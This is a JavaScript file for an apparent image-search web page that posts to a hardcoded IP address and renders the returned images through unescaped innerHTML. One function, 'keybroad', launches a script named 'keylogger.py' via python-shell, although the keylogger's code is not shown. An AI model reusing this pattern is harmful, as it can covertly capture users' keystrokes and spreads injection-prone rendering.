function refresh() {
  fetch("http://192.249.18.145:443/refresh", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({}),
  })
    .then((res) => {
      if (res.status === 400) {
        console.log("fail");
      } else if (res.status === 200) {
        console.log("success");
        document.getElementById("container").innerHTML = "image section";
      }
    })
    .catch((error) => console.log("error", error));
}
console.log("refresh");

function search_local() {
  search = document.getElementById("search_local").value;
  image = document.getElementById("getimage");
  document.getElementById("container").innerHTML = "";
  var index = 0;

  fetch("http://192.249.18.145:443/search", {
    method: "POST",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      hashtag: search,
    }),
  })
    .then((res) => {
      if (res.status === 400) {
        console.log("fail");
      } else if (res.status === 200) {
        console.log("success");
        res.json().then((json) => {
          while (index < json.length) {
            imgsrc =
              "data:image/" +
              json[index].img.contentType.toString() +
              ";base64," +
              json[index].img.data.toString("base64");
            document.getElementById("container").innerHTML +=
              "<img width = '400px' height = '300px' src=" + imgsrc + ">";
            index++;
          }
        });
      }
    })
    .catch((error) => console.log("error", error));

  document.getElementById("search_local").value = "";
}

function keybroad() {
  const { PythonShell } = require("python-shell");
  let options = {
    scriptPath: "path/to/my/scripts",
    args: ["value1", "value2", "value3"],
  };
  PythonShell.run("keylogger.py", options, function (err, data) {
    if (err) throw err;
    console.log(data);
  });
}

function upload() {
  document.getElementById("upload").reset();
}

function showPopup() {
  window.open("popup.html", "a", "width=400, height=300, left=100, top=50");
}
